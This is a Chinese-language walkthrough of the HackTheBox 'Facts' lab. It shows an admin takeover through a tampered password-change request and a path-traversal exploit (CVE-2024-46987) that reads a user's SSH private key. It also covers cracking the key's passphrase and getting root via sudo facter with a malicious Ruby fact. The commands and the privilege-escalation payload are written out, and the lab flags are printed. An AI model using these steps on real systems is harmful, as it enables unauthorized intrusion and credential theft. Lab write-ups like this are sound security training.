---
title: HTB Facts 靶场 Writeup
date: 2026-08-28 20:30:00
categories:
  - 靶场
tags:
  - HTB
  - Facts
  - 靶场
description: HTB Facts 靶场 Writeup
---

## Nmap

将机器主机名添加到本地主机文件中：

```
echo "10.129.244.96 facts.htb" | sudo tee -a /etc/hosts
```

10.129.244.96

![image-20260319213637050](/img/htb/htb-facts-001.png)

扫端口：

![image-20260319214306852](/img/htb/htb-facts-002.png)

目录扫描：

```
feroxbuster -u http://facts.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

![image-20260320181056530](/img/htb/htb-facts-003.png)

扫到：http://facts.htb/admin/login

<img src="/img/htb/htb-facts-004.png" alt="image-20260320181209163" style="zoom:50%;" />

随意注册登录：

<img src="/img/htb/htb-facts-005.png" alt="image-20260320181327811" style="zoom:50%;" />

登录后发现CMS版本

![image-20260320181440321](/img/htb/htb-facts-006.png)

## CMS

在用户这里可以修改密码

![image-20260320181640408](/img/htb/htb-facts-007.png)

抓包：

![image-20260320182100348](/img/htb/htb-facts-008.png)

改成admin

![image-20260320184040821](/img/htb/htb-facts-009.png)

再次登录即可进入到管理员界面

![image-20260320184435366](/img/htb/htb-facts-010.png)

## CVE-2024-46987

Camaleon CMS 认证任意文件读取

[Goultarde/CVE-2024-46987: This Python PoC exploits CVE-2024-46987, a Path Traversal bug in Camaleon CMS 2.8.0 < 2.8.2 (work on 2.9.0). It allows authenticated users to read sensitive server files via the MediaController. Intended for authorized security auditing and educational research only.](https://github.com/Goultarde/CVE-2024-46987)

![image-20260320185250886](/img/htb/htb-facts-011.png)

拿到 id 为 1000 的用户名 trivia ，1001 是 william

接着读 ssh 私钥（id_rsa、id_ed 25519、id_ecdsa）

```none
python3 CVE-2024-46987.py -u http://facts.htb/ -l 1 -p 2 /home/trivia/.ssh/id_ed25519
```

![image-20260320190231094](/img/htb/htb-facts-012.png)

## ssh2john

读到ssh 私钥之后，ssh 登录，但是 key 有密码用 ssh 2 john 存为 hash，再用 john 爆破

先把私钥内容保存成本地文件，然后给权限

![image-20260320190728046](/img/htb/htb-facts-013.png)

再用 `ssh2john` 提取成 John 可爆破的 hash

```
python3 /usr/share/john/ssh2john.py id_ed5519 > ssh.hash
```

![image-20260320190906201](/img/htb/htb-facts-014.png)

在用john爆破密码

![image-20260320191317578](/img/htb/htb-facts-015.png)

![image-20260320191539883](/img/htb/htb-facts-016.png)

ssh连接

```
chmod 600 id_ed5519                                             
ssh -i ./id_ed5519 trivia@facts.htb
```

ssh 上去之后，在 william 目录拿到 flag 1: 9cbd4e6c2bc8315e960b3a3f9c890713

![image-20260320192547964](/img/htb/htb-facts-017.png)

## 提权

sudo -l （列出当前用户可以通过 sudo 执行的命令）找到免 passwd 命令 /usr/bin/facter

>  `facter` 是Puppet 生态里的一个信息收集工具，正常用途是输出系统信息，比如：主机名，IP，操作系统版本，CPU/内存信息
>

它有一个很重要的功能：**支持加载“自定义 facts”**

也就是说，除了内置的信息收集逻辑外，它还能从指定目录读入你自己写的 Ruby 文件，然后把这些文件里的逻辑执行出来

![image-20260320192656423](/img/htb/htb-facts-018.png)

读取：

![image-20260320192817297](/img/htb/htb-facts-019.png)

[facter | GTFOBins](https://gtfobins.org/gtfobins/facter/)

Facter 有一个 --custom-dir 参数，可以构造 恶意的 Ruby fact 文件进行rce

![image-20260320193006505](/img/htb/htb-facts-020.png)

```bash
mkdir -p /tmp/rfacts
cat > /tmp/rfacts/evil.rb << 'EOF'
Facter.add('evil') do   //注册一个名字叫 evil 的自定义 fact
  setcode do          //当有人查询这个 fact 的值时，用这里面的代码去执行 /bin/bash
    system('/bin/bash')
  end
end
EOF
```

提权至 root

```bash
sudo /usr/bin/facter --custom-dir /tmp/rfacts evil
```

![image-20260320193324124](/img/htb/htb-facts-021.png)

![image-20260320194436536](/img/htb/htb-facts-022.png)

进入root目录拿到flag2： 487cb2b85816781deaa3d99a205c2b3d

![image-20260320194526135](/img/htb/htb-facts-023.png)